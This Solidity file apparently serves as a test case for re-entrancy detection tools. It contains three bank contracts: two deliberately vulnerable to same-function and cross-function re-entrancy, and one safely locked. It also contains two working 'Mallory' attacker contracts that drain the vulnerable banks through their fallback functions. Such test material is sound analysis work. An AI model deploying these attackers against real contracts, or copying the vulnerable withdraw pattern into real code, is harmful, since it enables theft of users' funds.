// This file contains 3 versions of the same contract.
//
// * VulnBankNoLock is vulnerable to simple same function re-entrancy
// * VulnBankBuggyLock is vulnerable to cross-function re-entrancy, due to a incomplete locking mechanism 
// * VulnBankSecureLock is not vulnerable due to the locking mechanism
//
// Both VulnBankBuggyLock and VulnBankSecureLock employ a locking mechanism to
// disable further state modifications to prevent re-entrancy attacks.
//
// VulnBankBuggLock does only prevent same-function re-entrancy. An attacker
// can still re-enter in the transfer function. 
//
// The Mallory contract performs a cross-function re-entrancy attack, which is
// possible for all contracts but the VulnBankSecureLock.
// 
// These contracts exercise edge cases of many analysis that try to identify
// re-entrancy vulnerabilities.
//
// VulnBankNoLock should be simple and detected easily.
//
// VulnBankBuggyLock can only be exploited by cross-function re-entrancy. So
// either the tool has to be aware of cross-function re-entrancy, or it reports
// a false positive for same-function re-entrancy.
//
// VulnBankSecureLock is not exploitable by re-entrancy, but for an analysis
// tool, it looks like a re-entrancy bug. The locking mechanism is hard to
// differentiate from other functionality, especially on the EVM bytecode
// level.

pragma solidity ^0.5.0;
/*pragma solidity ^0.4.21;*/

contract VulnBank {
    function getBalance(address a) public view returns(uint);
    function deposit() public payable; 
    function transfer(address to, uint amount) public; 
    function withdrawBalance() public; 
}

contract VulnBankNoLock is VulnBank {

    mapping (address => uint) private userBalances;

    function getBalance(address a) public view returns(uint) {
        return userBalances[a];
    }

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    function transfer(address to, uint amount) public {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        
        if (amountToWithdraw > 0) {
            msg.sender.call.value(amountToWithdraw)("");

            userBalances[msg.sender] = 0;
        }
    }
}

contract VulnBankBuggyLock is VulnBank {

    mapping (address => uint) private userBalances;
    mapping (address => bool) private disableWithdraw;

    function getBalance(address a) public view returns(uint) {
        return userBalances[a];
    }

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    function transfer(address to, uint amount) public {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        require(disableWithdraw[msg.sender] == false);

        uint amountToWithdraw = userBalances[msg.sender];
        
        if (amountToWithdraw > 0) {
            disableWithdraw[msg.sender] = true;
            msg.sender.call.value(amountToWithdraw)("");
            disableWithdraw[msg.sender] = false;

            userBalances[msg.sender] = 0;
        }
    }
}


contract VulnBankSecureLock is VulnBank {

    mapping (address => uint) private userBalances;
    mapping (address => bool) private disableWithdraw;

    function getBalance(address a) public view returns(uint) {
        return userBalances[a];
    }

    function deposit() public payable {
        require(disableWithdraw[msg.sender] == false);

        userBalances[msg.sender] += msg.value;
    }

    function transfer(address to, uint amount) public {
        require(disableWithdraw[msg.sender] == false);

        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        require(disableWithdraw[msg.sender] == false);
        uint amountToWithdraw = userBalances[msg.sender];
        
        if (amountToWithdraw > 0) {
            disableWithdraw[msg.sender] = true;
            msg.sender.call.value(amountToWithdraw)("");
            disableWithdraw[msg.sender] = false;

            userBalances[msg.sender] = 0;
        }
    }
}

contract MallorySameFunction {
    VulnBank vb;
    // for solidity 0.5
    address payable owner;
    // for solidity 0.4.21
		/*address owner;*/

    // for solidity 0.5
    constructor(VulnBank _vb) public {
    // for solidity 0.4.21
		/*function Mallory(VulnBank _vb) public {*/
        owner = msg.sender;
        vb = _vb;
    }

    function gimme() public payable { }

    function attack() public payable {
        // deposit all ether
        vb.deposit.value(address(this).balance)();
        // and extract again
        vb.withdrawBalance();
        owner.transfer(address(this).balance);
    }

    function () external payable {
        vb.withdrawBalance();
    }
}

contract MalloryCrossFunction {
    VulnBank vb;
    // for solidity 0.5
    address payable owner;
    // for solidity 0.4.21
		/*address owner;*/

    // for solidity 0.5
    constructor(VulnBank _vb) public {
    // for solidity 0.4.21
    /*function Mallory(VulnBank _vb) public {*/
        owner = msg.sender;
        vb = _vb;
    }

    function gimme() public payable { }

    function attack() public payable {
        // deposit all ether
        vb.deposit.value(address(this).balance)();
        // and extract again
        vb.withdrawBalance();
        owner.transfer(address(this).balance);
    }

    function () external payable {
        // transfer to owner
        vb.transfer(owner, vb.getBalance(address(this)));
    }
}

